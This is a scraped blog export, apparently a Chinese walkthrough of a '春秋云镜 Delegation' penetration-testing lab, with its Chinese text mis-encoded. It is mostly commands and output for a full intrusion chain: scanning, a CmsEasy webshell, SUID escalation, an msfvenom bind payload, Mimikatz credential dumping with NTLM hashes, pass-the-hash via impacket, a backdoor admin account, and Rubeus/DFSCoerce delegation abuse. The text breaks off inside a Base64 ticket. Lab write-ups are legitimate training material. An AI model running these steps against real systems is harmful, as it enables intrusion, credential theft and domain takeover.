09bb349ab17bbe480b91eb20bb204bee 532480500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 5121104 XIAORANG-OA01$ 25e4b9f501c8831b0568fcc61e4ddc7f 40961108 XIAORANG-WIN7$ acf1bc550440e81c9f2663ff304b4ab3 4096 æœ‰åŸŸæ§çš„å“ˆå¸Œäº†ç›´æ¥æ‰“åŸŸæ§ï¼Œç„¶åå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº† 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-psexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.2 -codec gbkC:\\Users\\Administrator\\flag&gt; type flag03.txt 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-psexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.18 -codec gbkC:\\Users\\Administrator\\flag&gt; type flag02.txt çœ‹åˆ«äººçš„wpï¼Œå¥½åƒæ˜¯è¦å…ˆæ‰“172.22.1.18ï¼Œæ˜¯ä¸€ä¸ªOAç³»ç»Ÿå¯ä»¥æ‰“ndayä¸€æŠŠæ¢­ï¼Œæˆ‘å°±ä¸çœ‹äº†","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Delegation","slug":"æ˜¥ç§‹äº‘é•œ-Delegation","date":"2025-04-18T02:26:30.000Z","updated":"2025-04-19T13:27:13.529Z","comments":true,"path":"2025/04/18/æ˜¥ç§‹äº‘é•œ-Delegation/","permalink":"https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/","excerpt":"","text":"FLAG1é¦–å…ˆå¯¹é¶æœºè¿›è¡Œä¿¡æ¯æœé›† 12345678910111213141516171819202122232425262728â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.99.130.13â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-17 22:29:55] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-17 22:29:55] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-17 22:29:55] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-04-17 22:29:55] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-17 22:29:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:22[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:21[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:3306[2025-04-17 22:29:56] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.130.13:80[2025-04-17 22:29:56] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-17 22:29:56] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:21 =&gt; [ftp] ç‰ˆæœ¬:3.0.3 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.3).][2025-04-17 22:30:01] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:3306 =&gt; [mysql] ç‰ˆæœ¬:8.0.29-0ubuntu0.20.04.3 äº§å“:MySQL[2025-04-17 22:30:01] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.130.13:80 =&gt; [http][2025-04-17 22:30:04] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 4[2025-04-17 22:30:04] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-17 22:30:04] [INFO] åŠ è½½çš„æ’ä»¶: ftp, mysql, ssh, webpoc, webtitle[2025-04-17 22:30:05] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.130.13 çŠ¶æ€ç :200 é•¿åº¦:68104 æ ‡é¢˜:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜ 80ç«¯å£æ˜¯cmseasy,urlåé¢æ‹¼æ¥/adminç‰ˆæœ¬å·æ˜¯v7752,åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°æ¼æ´ https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/ éƒ½éœ€è¦ç™»å½•åå°ï¼Œå¼±å£ä»¤admin:123456ç™»å½•æˆåŠŸäº† å‘åŒ…ç„¶åå»è®¿é—®1.phpå¯ä»¥å‘ç°å†™å…¥æˆåŠŸäº†ï¼Œå†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åèšå‰‘è¿æ¥ flagåœ¨/home/flag/ä¸‹ï¼Œä½†æ˜¯åªæœ‰rootèƒ½æŸ¥çœ‹ï¼Œåå¼¹ä¸€ä¸ªshellå‡†å¤‡ææƒ 1234567891011121314151617181920www-data@localhost:/var/www/html$ find / -perm -u=s 2&gt;/dev/nullfind / -perm -u=s 2&gt;/dev/null/usr/bin/stapbpf/usr/bin/gpasswd/usr/bin/chfn/usr/bin/su/usr/bin/chsh/usr/bin/staprun/usr/bin/at/usr/bin/diff/usr/bin/fusermount/usr/bin/sudo/usr/bin/mount/usr/bin/newgrp/usr/bin/umount/usr/bin/passwd/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device å¯ä»¥çœ‹åˆ°diffå…·æœ‰suidæƒé™ï¼Œå¯ä»¥è¯»å–flag01.txt FLAG2è¿˜ç»™äº†ä¸€ä¸ªhint 123Great job!!!!!!Here is the hint: WIN19\\AdrianI&#x27;ll do whatever I can to rock you... ä¸Šä¼ ä¸€ä¸ªfscanå…ˆæ‰«ï¼Œç„¶ååšä¸€ä¸ªä»£ç†éš§é“ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687www-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24./fscan -h 172.22.4.36/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-18 11:04:32] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-18 11:04:32] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-18 11:04:32] [INFO] CIDRèŒƒå›´: 172.22.4.0-172.22.4.255[2025-04-18 11:04:32] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)[2025-04-18 11:04:32] [INFO] è§£æCIDR 172.22.4.36/24 -&gt; IPèŒƒå›´ 172.22.4.0-172.22.4.255[2025-04-18 11:04:33] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-18 11:04:33] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-18 11:04:33] [INFO] æ­£åœ¨å°è¯•æ— ç›‘å¬ICMPæ¢æµ‹...[2025-04-18 11:04:33] [INFO] å½“å‰ç”¨æˆ·æƒé™ä¸è¶³,æ— æ³•å‘é€ICMPåŒ…[2025-04-18 11:04:33] [INFO] åˆ‡æ¢ä¸ºPINGæ–¹å¼æ¢æµ‹...[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.7 å­˜æ´» (ICMP)[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.36 å­˜æ´» (ICMP)[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.45 å­˜æ´» (ICMP)[2025-04-18 11:04:33] [SUCCESS] ç›®æ ‡ 172.22.4.19 å­˜æ´» (ICMP)[2025-04-18 11:04:39] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4[2025-04-18 11:04:39] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:80[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:80[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:135[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:139[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.19:135[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:139[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:135[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.19:139[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:389[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:445[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:22[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:21[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.19:445[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.45:445[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.7:88[2025-04-18 11:04:39] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.4.36:3306[2025-04-18 11:04:39] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-18 11:04:40] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:21 =&gt; [ftp] ç‰ˆæœ¬:3.0.3 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.3).][2025-04-18 11:04:40] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:3306 =&gt; [mysql] ç‰ˆæœ¬:8.0.29-0ubuntu0.20.04.3 äº§å“:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \\&gt;; caching_sha2_password][2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:80 =&gt; [http][2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:139 =&gt; Banner:[.][2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:139 =&gt; Banner:[.][2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.19:139 =&gt; Banner:[.][2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:389 =&gt; [ldap] äº§å“:Microsoft Windows Active Directory LDAP ç³»ç»Ÿ:Windows ä¿¡æ¯:Domain: xiaorang.lab, Site: Default-First-Site-Name[2025-04-18 11:04:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:445 =&gt; [2025-04-18 11:04:45] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.19:445 =&gt; [2025-04-18 11:04:45] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:445 =&gt; [2025-04-18 11:04:45] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:88 =&gt; [2025-04-18 11:04:48] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.36:80 =&gt; [http][2025-04-18 11:05:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.7:135 =&gt; [2025-04-18 11:05:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.19:135 =&gt; [2025-04-18 11:05:44] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.4.45:135 =&gt; [2025-04-18 11:05:44] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 16[2025-04-18 11:05:44] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-18 11:05:44] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-18 11:05:44] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.4.45ä¸»æœºå: WIN19å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.4.45[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45 XIAORANG\\WIN19 [2025-04-18 11:05:45] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.4.45 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server[2025-04-18 11:05:45] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.4.7ä¸»æœºå: DC01å‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.4.7[2025-04-18 11:05:45] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.4.19ä¸»æœºå: FILESERVERå‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.4.19[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7 DC:DC01.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19 FILESERVER.xiaorang.lab Windows Server 2016 Standard 14393[2025-04-18 11:05:45] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.4.7 [Windows Server 2016 Datacenter 14393][2025-04-18 11:05:45] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.4.36 çŠ¶æ€ç :200 é•¿åº¦:68100 æ ‡é¢˜:ä¸­æ–‡ç½‘é¡µæ ‡é¢˜ ä¸Šé¢çš„flag1ç»™äº†ä¸ªæç¤ºåœ¨WIN19é‚£å°æœºå™¨ä¸Šå­˜åœ¨ä¸€ä¸ªAdrianç”¨æˆ·ï¼Œå¯†ç åœ¨rockyoué‡Œ 1SMB 172.22.4.45 445 WIN19 [-] WIN19\\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED è¿˜æ˜¯å¾—çœ¼å°–ä¸€ç‚¹ï¼Œå¯†ç è¿‡æœŸä»–ä¸ä¼šå‘Šè¯‰ä½ ï¼Œrdpç™»å½•ä¿®æ”¹å¯†ç  1rdesktop 172.22.4.45 æ¡Œé¢ä¸Šæœ‰ä¸€ä¸ªPrivescCheckæ–‡ä»¶å¤¹ï¼ŒPrivescCheckæ˜¯ä¸€ä¸ªææƒçš„å·¥å…·ï¼Œä»–è·‘å®Œäº†ç•™ä¸‹ä¸€ä¸ªhtmlæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å°±è¡Œ ç»™äº†ä¸¤ä¸ªhighï¼Œç¬¬ä¸€ä¸ªWSUS æ›´å¤šçš„æ˜¯è¢«åˆ©ç”¨æ¥æ¨ªå‘ç§»åŠ¨,ç¬¬äºŒä¸ªæ³¨å†Œè¡¨ï¼Œç”¨æˆ·å¯¹gpupdateå…·æœ‰å†™ã€å¯åŠ¨ã€åœæ­¢çš„çš„æƒé™ ç”¨msfç”Ÿæˆä¸€ä¸ªæ­£å‘çš„æœ¨é©¬ 123456msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exeuse exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset LPORT 9999set RHOST 172.22.4.45run å°†é©¬ä¸Šä¼ ä¸Šå»ç„¶åä¿®æ”¹ä¸€ä¸‹æ³¨å†Œè¡¨æ‰‹åŠ¨å¯åŠ¨æœåŠ¡ 1sc start gupdate ä½†æ˜¯è¿™ä¸ªshellå¾ˆå¿«å°±ä¼šæ–­å¼€ï¼Œæ‰€ä»¥è¦è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ä¸­ 12psmigrate PID ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„msf shellå¯åŠ¨ä¸èµ·æ¥ï¼Œå¯¼å‡ºhash 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859load kiwicreds_allmeterpreter &gt; creds_all[+] Running as SYSTEM[*] Retrieving all credentialsmsv credentials===============Username Domain NTLM SHA1-------- ------ ---- ----Adrian WIN19 4ba5d16eb261eb61148ab5264f457cbb 9a712bd84b09123d36da74d9d5ac255c027588ebWIN19$ XIAORANG d41fef724adf6f2ed2cbb5a4ebd186c9 af156e5c6afc93b1a648040bd59f7d5cab23d81aWIN19$ XIAORANG 5943c35371c96f19bda7b8e67d041727 5a4dc280e89974fdec8cf1b2b76399d26f39b8f8wdigest credentials===================Username Domain Password-------- ------ --------(null) (null) (null)Adrian WIN19 (null)WIN19$ XIAORANG (null)kerberos credentials====================Username Domain Password-------- ------ --------(null) (null) (null)Adrian WIN19 (null)WIN19$ xiaorang.lab ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25 75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4 5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16 9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a 75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6 1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5 c 57 a8WIN19$ xiaorang.lab 3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d 90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5 9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90 0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5 3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f 8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e 1 d0 1fwin19$ XIAORANG.LAB ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25 75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4 5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16 9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a 75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6 1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5 c 57 a8 hashdump 12345Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::Adrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e::: ç”¨Administratorç™»å½• 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45C:\\&gt;type C:\\Users\\Administrator\\flag\\flag02.txt FLAG3&amp;FLAG4æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ· 12net user lv Asd123132 /addnet localgroup administrators lv /add æŸ¥çœ‹åŸŸå†…å§”æ´¾å…³ç³» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071C:\\Users\\lv\\Desktop&gt;Adinfo_win.exe -d=&quot;xiaorang.lab&quot; --dc=&quot;172.22.4.7&quot; -u=&quot;WIN19$&quot; -H=&quot;d41fef724adf6f2ed2cbb5a4ebd186c9&quot; _____ _ __ /\\ | __ \\(_) / _| / \\ | | | |_ _ __ | |_ ___ / /\\ \\ | | | | | &#x27;_ \\| _/ _ \\ Tools that collect information from domain / ____ \\| |__| | | | | | || (_) | /_/ \\_\\_____/|_|_| |_|_| \\___/ v1.5 by lzz[i] Try to connect &#x27;172.22.4.7&#x27;[c] Auth Domain: xiaorang.lab[c] Auth user: WIN19$[c] Auth hash: d41fef724adf6f2ed2cbb5a4ebd186c9[c] connected successfully,try to dump domain info[i] DomainVersion found! [+] Windows 2016 Server operating system[i] Domain SID: [+] S-1-5-21-1913786442-1328635469-1954894845[i] Domain MAQ found [+] 10[i] Domain Account Policy found [+] pwdHistory: 24 [+] minPwdLength: 7 [+] minPwdAge: 1(day) [+] maxPwdAge: 42(day) [+] lockoutThreshold: 0 [+] lockoutDuration: 30(min)[i] Domain Controllers: 1 found [+] DC01$ ==&gt;&gt;&gt; Windows Server 2016 Datacenter [10.0 (14393)] ==&gt;&gt;&gt; 172.22.4.7[i] ADCS has not found![i] Domain Exchange Server: 0 found[i] Domain All DNS: [+] Domain Dns 3 found,Saved in All_DNS.csv[i] Domain Trusts: 0 found[i] SPN: 39 found[i] Domain GPOs: 2 found[i] Domain Admins: 1 users found [+]Administrator[i] Enterprise Admins: 1 users found [+]Administrator[i] administrators: 1 users found [+]Administrator[i] Backup Operators: 0 users found[i] Users: 6 found[i] User with Mail: 0 found[i] Only_name_and_Useful_Users: 3 found[i] Only_admincount=1_andUseful_Users: 1 found[i] Locked Users: 0 found[i] Disabled Users: 3 found[i] Users with passwords not set to expire: 2 found[i] Domain Computers: 5 found[i] Only_name_and_Useful_computers: 5 found[i] Groups: 49 found[i] Domain OUs: 1 found[i] LAPS Not found[i] LAPS passwords: 0 found[i] SensitiveDelegate Users: 0 found[i] AsReproast Users: 0 found[i] Kerberoast Users: 1 found [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab ==&gt;&gt;&gt; kadmin/changepw[i] SIDHistory Users: 0 found[i] CreatorSID Users: 2 found [+] WIN-3X7U15C2XDM$ ==&gt;&gt;&gt; Marcus [+] WIN-YUUAW2QG9MF$ ==&gt;&gt;&gt; Marcus[i] RBCD Users: 0 found[i] Unconstrained Deligation Users: 1 found [+] WIN19$[i] Constrained Deligation Users: 0 found[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST[i] CSVs written to &#x27;csv&#x27; directory in C:\\Users\\lv\\Desktop[i] Execution took 1.0246743s 12[i] Unconstrained Deligation Users: 1 found [+] WIN19$ WIN19$æœ‰éçº¦æŸå§”æ´¾ï¼Œä¸Šä¼ Rubeusè¿›è¡Œç›‘å¬ 1Rubeus.exe monitor /interval:1 /filteruser:DC01$ 12345678910111213141516C:\\Users\\lv\\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$ ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0[*] Action: TGT Monitoring[*] Target user : DC01$[*] Monitoring every 1 seconds for new TGTs ç„¶åä½¿ç”¨dfscoerceè®©DSå‘WIN19$è®¤è¯ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# proxy -f proxychains4.conf -q python3 ../script/AD/dfscoerce.py -u &quot;WIN19$&quot; -hashes :d41fef724adf6f2ed2cbb5a4ebd186c9 -d xiaorang.lab WIN19 172.22.4.7[-] Connecting to ncacn_np:172.22.4.7[\\PIPE\\netdfs][+] Successfully bound![-] Sending NetrDfsRemoveStdRoot!NetrDfsRemoveStdRootServerName: &#x27;WIN19\\x00&#x27;RootShare: &#x27;test\\x00&#x27;ApiFlags: 1DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748C:\\Users\\lvv\\Desktop&gt;Rubeus.exe monitor /interval:1 /filteruser:DC01$ ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.2.0[*] Action: TGT Monitoring[*] Target user : DC01$[*] Monitoring every 1 seconds for new TGTs[*] 2025/4/18 4:54:32 UTC - Found new TGT: User : DC01$@XIAORANG.LAB StartTime : 2025/4/18 10:28:04 EndTime : 2025/4/18 20:28:04 RenewTill : 2025/4/25 10:28:04 Flags : name_canonicalize, pre_authent, renewable, forwarded, forwardable Base64EncodedTicket : doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRn 